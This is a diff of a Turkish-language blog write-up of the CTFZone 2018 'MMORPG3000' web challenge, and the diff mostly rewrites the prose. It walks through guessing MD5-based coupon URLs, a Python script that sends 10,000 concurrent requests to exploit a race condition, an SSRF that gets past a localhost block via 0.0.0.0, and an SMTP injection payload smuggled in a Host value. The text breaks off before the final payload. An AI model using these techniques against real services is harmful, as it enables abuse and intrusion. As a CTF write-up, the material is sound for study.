@@ -10,35 +10,31 @@ gtag('config', 'UA-118381182-2');</script><link rel="stylesheet" href="/css/arkn
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
  font-display: swap;
-}</style><meta name="generator" content="Hexo 5.2.0"></head><body><header><nav><a href="/">Home</a><a href="/archives/">Archives</a><a href="/about/">About</a></nav></header><main><article><div id="post-bg"><div id="post-title"><div id="post-info"><span>date:<time datetime="2018-07-23T15:34:10.000Z" id="date"> 2018-07-23</time></span><br><span>updated:<time datetime="2020-12-11T13:14:58.663Z" id="updated"> 2020-12-11</time></span></div><h1>MMORPG3000 - CTFZone 2018</h1><hr></div><div id="post-content"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">Here is a new generation mmorpg game, where you can beat your friends, just finished crowdfunding campaign and available on your PC starting today. It&#39;s a bit buggy, but you know...<br>I heard that developers of this game are really greedy.<br><br>http:&#x2F;&#x2F;web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one&#x2F;game&#x2F;battle&#x2F;competitors&#x2F;<br></code></pre></td></tr></table></figure>
+}</style><meta name="generator" content="Hexo 5.2.0"></head><body><header><nav><a href="/">Home</a><a href="/archives/">Archives</a><a href="/about/">About</a></nav></header><main><article><div id="post-bg"><div id="post-title"><div id="post-info"><span>date:<time datetime="2018-07-23T15:34:10.000Z" id="date"> 2018-07-23</time></span></div><h1>MMORPG3000 - CTFZone 2018</h1><hr></div><div id="post-content"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">Here is a new generation mmorpg game, where you can beat your friends, just finished crowdfunding campaign and available on your PC starting today. It&#39;s a bit buggy, but you know...<br>I heard that developers of this game are really greedy.<br><br>http:&#x2F;&#x2F;web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one&#x2F;game&#x2F;battle&#x2F;competitors&#x2F;<br></code></pre></td></tr></table></figure>
 
-
-<p>Linke gittik, üye olduktan sonra karşımıza böyle bir sayfa çıktı.  </p>
-<p><img src="1.png"></p>
-<p>Bedava kuponumuzu almak üzere <strong>donate</strong> sayfasına gittik.</p>
+<p>Verilen linke tikladigimizda assagidaki sayfa goruluyor.</p>
+<p><img src="1.png"><br>Sunulan bedava kuponu almak uzere donate sayfasini gittik.</p>
 <p><img src="2.png"></p>
-<p>Kuponumuzu girdik ve karşımıza böyle bir resim çıktı</p>
+<p>Verilen hediye kuponu girdikten sonra assagidaki resim ile karsilastik.</p>
 <p><img src="3.png"></p>
-<p>Resimin <strong>URL</strong>‘si şu şekildeydi;</p>
+<p>Resimin <strong>URL</strong>‘si şu şekilde;</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">http:&#x2F;&#x2F;web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one&#x2F;storage&#x2F;img&#x2F;coupon_aa2a77371374094fe9e0bc1de3f94ed9.png<br></code></pre></td></tr></table></figure>
 
-<p>__coupon_aa2a77371374094fe9e0bc1de3f94ed9__ kısmındaki hash kısmı userid’in hash hali olduğunu fark ettik. Başka sayı hashleyip denedik.</p>
-<p><strong>1682</strong>‘in <strong>MD5</strong>‘ini aldık ve denedik <strong>6a81681a7af700c6385d36577ebec359</strong></p>
+<p>__coupon_aa2a77371374094fe9e0bc1de3f94ed9__ urlin suffixi userid’in md5li hali oldugunu farkettik ve baska bir sayinin md5’ini alip denedik.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">http:&#x2F;&#x2F;web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one&#x2F;storage&#x2F;img&#x2F;coupon_6a81681a7af700c6385d36577ebec359.png<br></code></pre></td></tr></table></figure>
 
 <p><img src="4.png"></p>
-<p><strong>b92ee610-4289</strong> çıktı ve kuponu denedik 1 balance verdi. bir kaç kupoon daha denedik ve 1349 cuponumuz oldu.</p>
-<p>Para ile level atlattik fakat level 30’un üstüne para ile geçilmediğini öğrendik. Belki <strong>Race Condition</strong> vardır diye çok thread ile aynı isteği başka bir hesapla denedik</p>
+<p>Kuponlar ile level atlattik fakat level 30’un otesine kuponlar ile gecilmiyormus. Bir umit <strong>Race Condition</strong> vardir diye umit ettik ve denedik.</p>
 <p><img src="5.png"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">from</span> aiohttp <span class="hljs-keyword">import</span> ClientSession<br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fetch</span>(<span class="hljs-params">url, session</span>):</span><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(url) <span class="hljs-keyword">as</span> response:<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> response.read()<br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">n</span>):</span><br>    sem = asyncio.Semaphore(n)<br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> ClientSession(cookies=&#123;<span class="hljs-string">&quot;session&quot;</span>: <span class="hljs-string">&quot;eyJ1aWQiOjgyOX0.DjeKvA.qA-vNIHjDFSPyuDwArZyGMQD984&quot;</span>&#125;) <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">await</span> asyncio.gather(*(asyncio.ensure_future(fetch(<span class="hljs-string">&quot;http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one:80/donate/lvlup&quot;</span>, session)) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n)))<br><br>number = <span class="hljs-number">10000</span><br>loop = asyncio.get_event_loop()<br><br>future = asyncio.ensure_future(run(number))<br>loop.run_until_complete(future)<br></code></pre></td></tr></table></figure>
 
 <p>Ve 30’uncu leveli geçtik</p>
 <p><img src="6.png"></p>
-<p>30’uncu leveli geçtiğimizden dolayı <strong>Avatar</strong> ekleme özelliği açıldı.</p>
+<p>30’uncu leveli gectigimizden dolayı <strong>Avatar</strong> ekleme ozelligi aktif olmus oldu.</p>
 <p><img src="7.png"></p>
-<p>Upload olayında birşey yoktu. <strong>SSRF</strong>‘tir diye düşündük. <strong>127.0.0.1</strong> ve <strong>localhost</strong> engelliydi bu yüzden <strong>SSRF</strong> olduğuna emin olduk. <strong>0.0.0.0</strong> adresini denedik ve yediğini fark ettik. Port taramaya başladık.</p>
+<p>Upload fonksiyonunda bir sey yoktu. Belki  <strong>SSRF</strong>‘tir. <strong>127.0.0.1</strong> ve <strong>localhost</strong> engelliydi bu yüzden <strong>SSRF</strong> olgundan emin olduk. Ama <strong>0.0.0.0</strong> adresi calisiyordu. Port taramaya basladik.</p>
 <p><img src="8.png"></p>
-<p><strong>25</strong>‘ci port yani <strong>SMTP</strong> portu açıktı. <strong>Host</strong>‘u manipüle ederek <strong>SMTP</strong>‘yi kullanmayı denedik.</p>
+<p><strong>25</strong>‘ci port yani <strong>SMTP</strong> portu acikmis. <strong>Host</strong>‘u manipüle ederek <strong>SMTP</strong>‘yi kullanmayı denedik.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs smtp">Host: [0.0.0.0<br>helo 1v3m<br>mail from:&lt;qaewjlfnwej@o3enzyme.com&gt;<br>rcpt to:&lt;root&gt;<br>data<br>subject: give me flag<br><br>1v3m<br>.<br>]:25<br></code></pre></td></tr></table></figure>
 
 <p>Yeni satır ayıracı <strong>SMTP</strong>‘de delimiter olduğu için her satırın sonuna yeni satırın <strong>URL Encoded</strong> hali olan <strong>%0A</strong>‘yı ekledik ve son payloadımızın son hali </p>
